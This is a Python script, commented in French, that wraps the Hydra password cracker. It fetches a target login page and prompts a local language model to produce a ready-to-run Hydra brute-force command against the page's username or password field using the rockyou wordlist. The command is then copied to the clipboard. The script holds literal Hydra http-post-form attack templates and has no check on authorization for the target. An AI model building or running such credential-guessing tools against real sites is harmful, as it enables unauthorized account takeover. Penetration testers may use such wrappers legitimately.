import os
import argparse
import requests
import pyperclip
import subprocess
import shutil
import tempfile
from rich.console import Console
from urllib.parse import urlparse

console = Console()


def check_dependencies():
    """
    Vérifie que les outils externes nécessaires ('mods' et 'gum') sont installés.
    """
    for tool in ["mods", "gum"]:
        if not shutil.which(tool):
            raise FileNotFoundError(f"L'outil '{tool}' n'est pas installé. Veuillez l'installer pour continuer.")


def analyze_page_with_ai(page_source, prompt):
    """
    Analyse une page source avec l'IA pour construire une commande Hydra.

    Args:
        page_source (str): Contenu HTML de la page cible.
        prompt (str): Prompt détaillant les attentes de l'analyse.

    Returns:
        str: Commande Hydra générée ou None en cas d'erreur.
    """
    with tempfile.NamedTemporaryFile(delete=False, suffix=".html") as temp_file:
        temp_file.write(page_source.encode())
        temp_file_path = temp_file.name

    try:
        mods_command = f"cat \"{temp_file_path}\" | mods -m expert-secu --api ollama -P \"{prompt}\""
        result = subprocess.run(
            mods_command,
            shell=True,
            capture_output=True,
            text=True,
            env=os.environ
        )

        if result.returncode != 0:
            raise Exception(f"Erreur 'mods': {result.stderr.strip()}")

        for line in result.stdout.splitlines():
            if line.strip().startswith("hydra"):
                return line.strip()

        raise ValueError("Aucune commande Hydra valide trouvée.")
    finally:
        os.remove(temp_file_path)



def determine_port(url):
    """
    Détermine le port basé sur l'URL.
    """
    parsed_url = urlparse(url)
    return str(parsed_url.port) if parsed_url.port else ("443" if parsed_url.scheme == "https" else "80")


def download_page_source(url):
    """
    Télécharge le code source d'une page web.
    """
    try:
        response = requests.get(url, timeout=10)
        response.raise_for_status()
        return response.text
    except requests.RequestException as e:
        console.print(f"[red]Erreur lors du téléchargement de la page : {e}[/red]")
        return None


def ask_action_with_gum():
    """
    Utilise 'gum choose' pour poser une question interactive.
    """
    choices = ["username", "password", "both"]
    result = subprocess.run(
        ["gum", "choose"] + choices,
        text=True,
        capture_output=True,
        check=True
    )
    return result.stdout.strip()

def main():
    parser = argparse.ArgumentParser(description="Wrapper pour générer des commandes Hydra.")
    parser.add_argument("--url", required=True, help="URL cible (http:// ou https://)")
    args = parser.parse_args()

    check_dependencies()

    url = args.url
    port = determine_port(url)
    dicos = os.getenv("DICOS", "./dictionaries")
    passlist = os.path.join(dicos, "Seclists", "rockyou.txt")

    console.print("[cyan]Sélectionnez une action (username ou password) :[/cyan]")
    action = ask_action_with_gum()

    # Contexte et prompts spécifiques pour chaque action
    if action == "username":
        context = (
            "On souhaite bruteforcer uniquement le champ de saisie du nom d'utilisateur avec un mot de passe fixe 'toto'. "
            "Identifie les paramètres nécessaires pour bruteforcer le champ 'username'."
        )
        prompt = (
            f"Analyse cette page HTML pour identifier les paramètres nécessaires à une attaque par brute-force sur le champ "
            f"'username' avec un mot de passe fixe 'toto'.\n\n"
            "Prototype de commande Hydra :\n"
            "hydra -L $DICOS/Seclists/rockyou.txt -p toto $URL -s $PORT http-post-form \"/chemin/vers/formulaire:champ_username=^USER^&champ_password=^PASS^:F=wrong username\" -V\n\n"
            "Instructions spécifiques :\n"
            "- Complète uniquement le prototype avec les informations exactes extraites de la page HTML.\n"
            "- N'inclus aucun texte explicatif dans ta réponse, retourne uniquement la commande Hydra complète et fonctionnelle.\n"
            "- Utilise les variables $DICOS, $URL et $PORT telles quelles, sans les remplacer.\n"
            "- Vérifie que la commande respecte la syntaxe de Hydra."
        )
    elif action == "password":
        context = (
            "On souhaite bruteforcer uniquement le champ de saisie du mot de passe pour un utilisateur fixe 'admin'. "
            "Identifie les paramètres nécessaires pour bruteforcer le champ 'password'."
        )
        prompt = (
            f"Analyse cette page HTML pour identifier les paramètres nécessaires à une attaque par brute-force sur le champ "
            f"'password' avec un utilisateur fixe 'admin'.\n\n"
            "Prototype de commande Hydra :\n"
            "hydra -l admin -P $DICOS/Seclists/rockyou.txt $URL -s $PORT http-form-post \"/chemin/vers/formulaire:champ_username=^USER^&champ_password=^PASS^:F=invalid\" -Vf\n\n"
            "Instructions spécifiques :\n"
            "- Complète uniquement le prototype avec les informations exactes extraites de la page HTML.\n"
            "- N'inclus aucun texte explicatif dans ta réponse, retourne uniquement la commande Hydra complète et fonctionnelle.\n"
            "- Utilise les variables $DICOS, $URL et $PORT telles quelles, sans les remplacer.\n"
            "- Vérifie que la commande respecte la syntaxe de Hydra."
        )
    else:
        console.print("[red]Action non valide. Veuillez choisir 'username' ou 'password'.[/red]")
        return

    page_source = download_page_source(url)
    if not page_source:
        console.print("[red]Impossible de récupérer la page source.[/red]")
        return

    try:
        hydra_command = analyze_page_with_ai(page_source, prompt)
        console.print(f"[green]Commande Hydra générée :[/green] {hydra_command}")
        pyperclip.copy(hydra_command)
    except Exception as e:
        console.print(f"[red]Erreur : {e}[/red]")


if __name__ == "__main__":
    main()
